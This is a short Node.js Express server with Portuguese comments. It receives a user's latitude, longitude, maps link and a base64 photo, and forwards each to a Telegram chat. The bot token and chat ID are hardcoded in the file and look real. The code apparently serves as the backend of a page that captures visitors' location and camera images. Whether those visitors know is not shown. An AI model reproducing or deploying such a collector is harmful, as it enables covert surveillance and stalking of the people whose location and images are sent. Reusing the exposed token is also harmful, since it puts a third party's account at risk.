const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const axios = require("axios");
const https = require("https");

const app = express();
app.use(cors());
app.use(bodyParser.json({ limit: "10mb" })); // aumenta limite para imagem grande

// Substitua com os valores reais
const TELEGRAM_BOT_TOKEN = "7674928346:AAEd6FNCSB_ozfmqs7islmmEaH6x8bWivVQ";
const TELEGRAM_CHAT_ID = "1276935257";

// Força uso de IPv4 e define timeout
const httpsAgent = new https.Agent({ family: 4 });

app.post("/send-location", async (req, res) => {
  const { latitude, longitude, maps } = req.body;

  const message = `A localização do usuário é:\nLatitude: ${latitude}\nLongitude: ${longitude}\nMaps: ${maps}`;

  try {
    await axios.post(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
      },
      {
        httpsAgent,
        timeout: 5000, // 5 segundos de timeout
      }
    );

    res.status(200).json({ success: true });
  } catch (error) {
    console.error("Erro ao enviar mensagem para o Telegram:", error.message || error);
    res.status(500).json({ success: false, message: "Erro ao enviar a localização para o Telegram." });
  }
});

app.post("/send-photo", async (req, res) => {
  const { image } = req.body;

  if (!image) {
    return res.status(400).json({ success: false, message: "Imagem não fornecida" });
  }

  try {
    // Envia a imagem base64 direto para Telegram (ele aceita data URI)
    const response = await axios.post(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
      {
        chat_id: TELEGRAM_CHAT_ID,
        photo: image,
      },
      {
        httpsAgent,
        timeout: 5000,
      }
    );

    res.json({ success: true, telegram_response: response.data });
  } catch (error) {
    console.error("Erro ao enviar foto para o Telegram:", error.message || error);
    res.status(500).json({ success: false, message: "Erro ao enviar foto" });
  }
});

app.listen(8088, () => {
  console.log("Servidor rodando na porta 8088");
});

